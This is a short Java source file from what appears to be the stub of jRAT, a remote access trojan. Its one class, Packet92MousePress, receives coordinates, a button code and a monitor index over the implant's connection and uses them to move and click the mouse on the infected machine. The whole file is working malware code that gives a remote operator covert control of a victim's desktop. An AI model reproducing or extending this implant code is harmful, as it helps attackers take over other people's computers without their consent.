package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet92MousePress extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int x = Connection.instance.readInt();
		int y = Connection.instance.readInt();
		int btn = Connection.instance.readInt();
		int monitor = Connection.instance.readInt();
		
		if (monitor == -1) {
			ScreenUtils.getDefault().mouseMove(x, y);
			ScreenUtils.getDefault().mousePress(btn);
		} else {
			ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
			ScreenUtils.getAllRobots()[monitor].mousePress(btn);
		}
	}

}
